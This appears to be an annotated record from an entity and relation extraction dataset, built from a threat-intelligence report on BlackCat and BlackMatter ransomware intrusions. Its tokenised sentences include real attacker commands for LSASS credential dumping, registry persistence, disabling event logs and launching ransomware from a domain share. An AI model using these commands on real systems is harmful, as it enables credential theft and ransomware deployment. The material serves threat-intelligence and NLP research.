{"doc_key": "028", "sentences": [["Initial", "access"], ["There", "was", "evidence", "in", "the", "BlackMatter", "attack", "that", "the", "actor", "established", "initial", "access", "via", "the", "possible", "exploitation", "of", "Microsoft", "Exchange", "vulnerabilities", "."], ["Beyond", "the", "access", "provided", "by", "the", "first", "exploitation", "vector", ",", "the", "attackers", "made", "sure", "they", "had", "additional", "remote", "access", "to", "several", "internal", "systems", "."], ["During", "the", "BlackCat", "attack", ",", "the", "actors", "used", "a", "tool", "called", "reverse-ssh", ",", "compiled", "with", "the", "C2", "server", "address", "embedded", ",", "to", "set", "up", "reverse", "SSH", "tunnels", "and", "provide", "reverse", "shells", "to", "the", "attacker", "."], ["Reverse-ssh", "was", "deployed", "to", "C", ":", "\\", "directory", "and", "named", ":", "system", ",", "Windows", "or", "cache", "task", "."], ["It", "was", "also", "observed", "hidden", "by", "writing", "to", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "C", ":", "\\", "directory", "using", "the", "following", "command", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["The", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "was", "another", "way", "to", "ensure", "the", "malicious", "file", "would", "be", "persistently", "executed", "on", "the", "system", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "used", "a", "similar", "technique", "but", "with", "a", "different", "tool", ":", "GO", "Simple", "Tunnel", "(", "GOST", ")", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "used", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "name", "used", "for", "the", "deployed", "Gost", "file", "was", "``", "system.exe", "''", ",", "similar", "to", "the", "file", "name", "used", "in", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["For", "example", ",", "before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", "(", "a", "full", "list", "of", "disabled", "logs", "is", "provided", "in", "the", "IOC", "section", "below", ")", "."], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "microsoft-windows-taskscheduler/operational", "/enabled", ":", "false"], ["The", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "small", "number", "of", "key", "systems", "."], ["c", ":", "\\users\\", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["Local", "and", "domain", "user", "credentials", "were", "collected", ",", "on", "a", "few", "key", "systems", ",", "by", "dumping", "the", "LSASS", "process", "memory", "and", "extracting", "credentials", "with", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "attacker", "used", "comsvcs.dll", "directly", "to", "dump", "LSASS", "memory", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Beyond", "the", "Windows", "login", "credentials", ",", "during", "the", "BlackCat", "attack", ",", "the", "attackers", "used", "a", "tool", "named", "``", "steal.exe", "''", "to", "harvest", "additional", "data", "."], ["ADRecon", "was", "also", "used", "to", "collect", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "."], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["During", "the", "BlackMatter", "attack", ",", "the", "attackers", "also", "searched", "for", "additional", "ways", "to", "maintain", "access", "."], ["For", "example", ",", "the", "following", "command", "shows", "the", "attackers", "exploring", "an", "existing", "TeamViewer", "installation", ":"], ["The", "following", "commands", "show", "the", "attackers", "exploring", "the", "keepass", "password", "manager", "config", ":"], ["This", "tool", "'s", "activity", "can", "be", "detected", "by", "detecting", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["This", "tool", "was", "often", "used", "to", "issue", "a", "command", "to", "allow", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "possibly", "for", "the", "convenience", "of", "using", "some", "prepared", "scripts", ":"], ["WinRM", "allows", "attackers", "to", "use", "PowerShell", "to", "execute", "commands", "on", "remote", "machines", "."], ["This", "tool", "can", "be", "detected", "by", "searching", "for", "processes", "started", "by", "``", "wsmprovhost.exe", "''", "."], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["Microsoft", "Remote", "Desktop", "was", "also", "used", "by", "the", "attackers", "to", "obtain", "GUI", "access", "to", "systems", "."], ["The", "following", "impacket", "command", "was", "issued", "before", "the", "adversary", "could", "gain", "remote", "admin", "access", "."], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\\\127.0.0.1\\admin\\", "$", "\\__", "<", "timestamp", ">", "\\.", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "due", "to", "what", "seems", "to", "be", "an", "OPSEC", "mistake", "using", "the", "attacker", "'s", "shell", "upload", "and", "download", "command", ",", "they", "revealed", "the", "use", "of", "Kali", "Linux", "to", "execute", "remote", "commands", "."], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "$", "\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "$", "\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "unlikely", "that", "the", "attackers", "had", "a", "Kali", "Linux", "installation", "inside", "the", "victim", "'s", "network", ",", "so", "remote", "control", "of", "the", "systems", "was", "likely", "achieved", "through", "the", "SSH", "tunnels", "described", "earlier", "."], ["It", "is", "possible", "that", "document", "exfiltration", "is", "carried", "out", "by", "the", "execution", "of", "upload/download", "commands", "similar", "to", "the", "ones", "listed", "above", "."], ["In", "both", "attacks", ",", "before", "the", "actual", "execution", "of", "the", "ransomware", ",", "the", "attackers", "performed", "several", "actions", "preparing", "systems", "to", "make", "the", "execution", "as", "successful", "as", "possible", "."], ["On", "the", "day", "of", "the", "attack", ",", "the", "attacker", "logged", "in", "to", "the", "domain", "controller", "and", "opened", "the", "group", "policy", "management", "interface", "."], ["The", "attackers", "then", "dropped", "and", "executed", "a", "file", "named", "``", "apply.ps1", ".", "''"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1"], ["This", "execution", "results", "in", "the", "immediate", "writing", "of", "group", "policy", "files", "to", "disk", "and", "is", "followed", "by", "the", "execution", "of", "the", "following", "command", "to", "force", "the", "deployment", "of", "the", "group", "policy", ":"], ["A", "few", "minutes", "before", "BlackCat", "ransomware", "started", "encrypting", "files", ",", "the", "attackers", "executed", "a", "script", "called", "``", "defender.vbs", "''", ":"], ["In", "the", "BlackMatter", "attack", ",", "the", "exact", "same", "file", "was", "named", "``", "def.vbs", "''", "and", "executed", "minutes", "before", "the", "encryption", "began", ":"], ["cmd.exe", "/c", "\\\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs"], ["When", "encryption", "begins", ",", "the", "ransomware", "file", "named", "<", "num", ">", ".exe", "in", "the", "BlackCat", "attack", "and", ",", "similarly", ",", "<", "num", ">", ".exe", "in", "the", "BlackMatter", "attack", ",", "was", "dropped", "on", "the", "domain", "servers", "inside", "the", "SYSVOL", "folder", ",", "making", "it", "accessible", "on", "the", "NETLOGON", "network", "share", ",", "accessible", "by", "all", "users", "in", "the", "domain", "."], ["File", "encryption", "makes", "all", "systems", "execute", "these", "files", "from", "the", "remote", "share", "."], ["cmd.exe", "-c", "\\\\", "<", "domain", "controller", ">", "\\netlogon\\", "<", "num", ">", ".exe", "--", "access-token", "<", "token", ">"], ["cmd.exe", "-c", "\\\\", "<", "domain", "controller", ">", "\\netlogon\\", "<", "num", ">", ".exe"], ["<", "num", ">", ".exe", "-access-token", "<", "token", ">", "-v", "-p", "\\\\", "<", "hostname", ">", "\\scans"], ["<", "num", ">", ".exe", "-access-token", "<", "token", ">", "-v", "-p", "."], ["The", "BlackCat", "executable", "deployed", "other", "commands", "to", "make", "its", "execution", "more", "effective", ":"], ["c", ":", "\\windows\\system32\\cmd.exe", "/c", "fsutil", "behavior", "set", "symlinkevaluation", "r2l:1"]], "ner": [[], [[7, 8, "MP"], [11, 11, "MP"], [20, 22, "MF"]], [[35, 35, "MP"]], [[54, 54, "MP"], [59, 59, "MF"], [64, 65, "SO"]], [[83, 83, "MF"]], [], [], [[141, 141, "SF"]], [], [[178, 179, "MP"], [182, 182, "MP"], [197, 197, "MF"]], [[200, 200, "MF"], [212, 213, "MF"], [218, 219, "SO"]], [[231, 231, "MF"], [242, 243, "MP"]], [[254, 254, "MF"], [258, 258, "MP"], [260, 260, "SF"]], [], [[292, 292, "MF"]], [], [[310, 314, "SF"], [334, 336, "MF"], [338, 338, "MF"]], [], [], [[353, 354, "MP"], [357, 357, "MP"], [359, 359, "MF"], [363, 364, "MF"]], [], [[384, 386, "TF"], [394, 394, "MP"], [400, 400, "MF"]], [[407, 407, "MF"]], [], [[434, 434, "MP"]], [[452, 452, "MP"], [456, 457, "TF"]], [[464, 464, "MP"], [467, 470, "TF"]], [[472, 473, "MF"]], [[492, 493, "MF"], [503, 504, "SO"], [509, 509, "SF"]], [[521, 521, "MF"], [523, 523, "MP"], [526, 526, "MP"]], [], [], [], [], [[577, 579, "MF"], [585, 585, "MP"], [588, 588, "SF"]], [], [], [[649, 649, "MP"], [666, 667, "MF"]], [], [], [[744, 744, "MP"], [767, 768, "MF"]], [[776, 777, "TF"], [785, 786, "MF"]], [], [[830, 830, "MP"], [840, 843, "SF"]], [[846, 846, "MP"], [855, 855, "MF"]], [], [[872, 874, "MF"], [886, 886, "MF"]], [[907, 907, "MP"], [913, 913, "MF"]], [[918, 919, "MP"], [928, 928, "MF"]], [], [[953, 959, "MF"], [965, 971, "MF"], [978, 982, "SO"]], [], [], [], [], [], [[1071, 1071, "MP"], [1075, 1075, "MF"]], []], "relations": [[], [[11, 11, 20, 22, "EX"], [7, 8, 64, 65, "ST"], [7, 8, 141, 141, "RD"], [7, 8, 64, 65, "RF"], [7, 8, 11, 11, "CO"], [7, 8, 35, 35, "CO"], [7, 8, 54, 54, "CO"]], [], [[54, 54, 59, 59, "WR"], [54, 54, 141, 141, "WR"], [59, 59, 83, 83, "CO"]], [], [], [], [], [], [[178, 179, 64, 65, "ST"], [178, 179, 64, 65, "RF"], [182, 182, 197, 197, "WR"], [178, 179, 212, 213, "WR"], [178, 179, 218, 219, "ST"], [178, 179, 218, 219, "RF"], [178, 179, 260, 260, "RD"], [178, 179, 254, 254, "WR"], [178, 179, 182, 182, "CO"], [178, 179, 242, 243, "CO"], [178, 179, 258, 258, "CO"]], [[200, 200, 197, 197, "CO"]], [[242, 243, 231, 231, "EX"]], [[258, 258, 260, 260, "WR"], [258, 258, 292, 292, "WR"]], [], [], [], [], [], [], [[353, 354, 200, 200, "WR"], [353, 354, 212, 213, "WR"], [353, 354, 218, 219, "ST"], [353, 354, 218, 219, "RF"], [353, 354, 254, 254, "WR"], [353, 354, 338, 338, "WR"], [357, 357, 310, 314, "CD"], [357, 357, 334, 336, "EX"], [357, 357, 338, 338, "EX"], [357, 357, 359, 359, "EX"], [357, 357, 363, 364, "WR"], [353, 354, 407, 407, "WR"], [357, 357, 407, 407, "WR"], [357, 357, 472, 473, "WR"], [357, 357, 394, 394, "CO"], [357, 357, 434, 434, "CO"], [357, 357, 452, 452, "CO"], [357, 357, 464, 464, "CO"], [357, 357, 523, 523, "CO"], [357, 357, 907, 907, "CO"]], [], [[394, 394, 384, 386, "WR"], [394, 394, 400, 400, "EX"]], [], [], [], [[452, 452, 456, 457, "RD"]], [[464, 464, 467, 470, "RD"]], [[472, 473, 521, 521, "CO"]], [], [[523, 523, 407, 407, "WR"], [523, 523, 509, 509, "RD"], [523, 523, 503, 504, "ST"], [523, 523, 509, 509, "WR"], [523, 523, 521, 521, "EX"], [523, 523, 526, 526, "FR"], [523, 523, 585, 585, "CO"], [523, 523, 649, 649, "CO"], [523, 523, 744, 744, "CO"], [523, 523, 830, 830, "CO"], [523, 523, 846, 846, "CO"]], [], [], [], [], [[585, 585, 577, 579, "EX"], [585, 585, 588, 588, "CD"]], [], [], [[649, 649, 666, 667, "EX"]], [], [], [[744, 744, 767, 768, "EX"], [744, 744, 776, 777, "WR"], [744, 744, 785, 786, "EX"]], [], [], [[830, 830, 840, 843, "RD"]], [[846, 846, 855, 855, "WR"], [846, 846, 855, 855, "EX"], [846, 846, 872, 874, "WR"], [846, 846, 886, 886, "EX"]], [], [], [[907, 907, 913, 913, "EX"], [907, 907, 918, 919, "CO"]], [[918, 919, 928, 928, "WR"], [918, 919, 928, 928, "EX"], [918, 919, 953, 959, "WR"], [918, 919, 965, 971, "WR"], [918, 919, 978, 982, "ST"]], [], [], [], [], [], [], [], [[1071, 1071, 1075, 1075, "EX"]], []]}